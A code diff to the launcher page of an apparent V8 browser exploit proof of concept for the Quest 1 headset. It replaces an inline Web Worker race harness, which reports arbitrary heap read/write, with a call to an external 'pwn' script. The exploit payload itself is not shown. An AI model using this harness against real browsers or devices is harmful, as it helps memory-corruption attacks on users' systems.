@@ -49,71 +49,19 @@ button.addEventListener('click', () => {
     }
     fuckingAround = true;
     alert('Press OK to start the exploit.\n\nYour headset may encounter issues during this.\nIf so, please reboot your headset and try again.\n\nIn no way is this root, this is demo PoC for exploits\nwithin the Quest Browser and is still limited in terms of power.\n\nThis is designed for the Quest 1 ONLY.\nThis will NOT work on newer headsets.');
-    
-    //Test for maglev
-    function test() {
-        let x = 0;
-        for (let i = 0; i < 1000; i++) x += i;
-        return x;
-    }
-    //Warm to Maglev tier (about 400 calls)
-    for (let i = 0; i < 500; i++) test();
-    const t0 = performance.now();
-    for (let i = 0; i < 100000; i++) test();
-    log((performance.now() - t0).toFixed(1) + 'ms (maglev)');
-
-    if ((performance.now() - t0).toFixed(1) > 500)
-    {
-        log('maglev unlikely');
-    }
-    
-    //Launch the race exploit
-    const start = performance.now();
-    let tries = 0;
-    let worker;
-    
-    log('starting exploit...');
-    try {
-        const testWorker = new Worker('worker.js');
-        log('worker created ok');
-    } catch(e) {
-        log('worker error: ' + e);
-        return;
-    }
-
-    function run() {
-        if (fails >= 100)
-        {
-            log(`error - exploit likely patched`);
-            return;
+    log('loading exploit...');
+    const script = document.createElement('script');
+    script.src = 'exploit_3079.js';
+    script.onload = () => {
+        const success = pwn(log);
+        if (success) {
+            log('exploit succeeded!');
+            passSound.play();
+        } else {
+            log('exploit failed or patched');
         }
-        tries++;
-        if (worker) worker.terminate();
-        worker = new Worker('worker.js');
-        worker.onmessage = ({data}) => {
-            if (data === 'READY') worker.postMessage('arm');
-            else if (data === 'ARMED') worker.postMessage('check');
-            else if (data === 'MISS') {
-                log('miss — retrying...');
-                fails++
-                run();
-            }
-            else if (data.startsWith('PASS')) {
-                worker.terminate();
-                const elapsed = ((performance.now() - start) / 1000).toFixed(2);
-                fails = 0;
-                passSound.play();
-                log(`pass - arb r/w in v8 heap`);
-                log(`result: ${data}`);
-                log(`try: ${tries} | time: ${elapsed}s`);
-            }
-        };
-        worker.onerror = ({message}) => {
-            log(`err: ${message}`);
-        };
-    }
-    
-    run();
+    };
+    document.head.appendChild(script);
 });
 </script>
 
